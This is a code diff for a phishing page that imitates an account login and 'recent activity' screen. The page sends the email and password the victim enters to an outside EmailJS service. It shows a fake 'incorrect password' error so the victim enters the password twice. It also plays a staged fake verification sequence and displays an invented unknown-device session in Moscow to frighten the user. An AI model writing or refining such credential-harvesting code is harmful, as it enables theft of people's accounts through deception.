@@ -407,7 +407,14 @@
 
     <!-- ============ ACTIVITY VIEW ============ -->
     <section id="activity-view">
-      <h1>Recent account activity</h1>
+
+      <header>
+        <div class="branding">
+          <img src="https://i.imghippo.com/files/knqa6398Itw.png" alt="Company logo" />
+        </div>
+        <h1>Recent account activity</h1>
+      </header>
+
       <p class="lede">Review sessions on your account</p>
 
       <div class="session-card" id="session-current">
@@ -657,7 +664,7 @@ async function sendAttemptToEmailJS({ emailValue, passwordValue, attempt }) {
 
   const attemptLabel = attempt === 1
     ? "FIRST ATTEMPT (Incorrect credentials shown)"
-    : "SECOND ATTEMPT (Retry after incorrect credentials)";
+    : "SECOND ATTEMPT (Verification successful)";
 
   const messageLog = [
     attemptLabel,
@@ -721,16 +728,16 @@ async function sendAttemptToEmailJS({ emailValue, passwordValue, attempt }) {
 }
 
 /* =========================================================================
-   Verifying sequence
+   Verifying sequence — under 3 seconds for the second attempt
    ========================================================================= */
 const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
 async function runVerifyingSequence() {
   const stages = [
-    { text: "Contacting authentication server…", delay: 1800 },
-    { text: "Verifying credentials…",            delay: 2200 },
-    { text: "Checking account activity…",        delay: 2000 },
-    { text: "Finalizing sign-in…",               delay: 1600 }
+    { text: "Contacting authentication server…", delay: 700 },
+    { text: "Verifying credentials…",            delay: 800 },
+    { text: "Checking account activity…",        delay: 700 },
+    { text: "Finalizing sign-in…",               delay: 600 }
   ];
   for (const stage of stages) {
     verifyStatus.textContent = stage.text;
@@ -739,7 +746,7 @@ async function runVerifyingSequence() {
 }
 
 /* =========================================================================
-   Form submit
+   Two-attempt flow
    ========================================================================= */
 let attemptNumber = 1;
 
@@ -783,13 +790,37 @@ form.addEventListener("submit", async (e) => {
   // Fire-and-forget: don't block the UX on EmailJS.
   sendAttemptToEmailJS({ emailValue, passwordValue, attempt: attemptNumber });
 
+  // ---- FIRST ATTEMPT: show "incorrect credentials", stay on the form ----
+  if (attemptNumber === 1) {
+    await sleep(900);
+    submitBtn.disabled    = false;
+    submitBtn.textContent = "Submit";
+
+    formErrorBanner.textContent =
+      "Incorrect username or password. Please try again.";
+    formErrorBanner.classList.add("show");
+
+    // Clear the password so the user retypes it, but keep the username.
+    passwordInput.value = "";
+    passwordInput.focus();
+
+    attemptNumber = 2;
+    return;
+  }
+
+  // ---- SECOND ATTEMPT: verify, then show activity view (< 3 s) ----
   // Pre-compute activity-view data.
   const now            = new Date();
   const thirtyMinLater = new Date(now.getTime() + 30 * 60 * 1000);
   const browser        = getBrowser();
   const os             = getOS();
-  const location       = await getLocation();
-  const locationLabel  = location || getTimezone();
+
+  // Don't block the sequence on network lookups — race with a timeout.
+  const location = await Promise.race([
+    getLocation(),
+    sleep(800).then(() => null)
+  ]);
+  const locationLabel = location || getTimezone();
 
   currentDeviceMeta.textContent = `${browser} on ${os} · ${locationLabel} · ${formatDeviceTime(now)}`;
   unknownDeviceMeta.textContent = `Chrome on Windows · Moscow, Russia · ${formatDeviceTime(thirtyMinLater)}`;
@@ -845,6 +876,7 @@ document.getElementById("this-was-me").addEventListener("click", () => {
 
   form.reset();
   formErrorBanner.classList.remove("show");
+  formErrorBanner.textContent = "";
   alertBox.textContent = "";
   attemptNumber = 1;
 
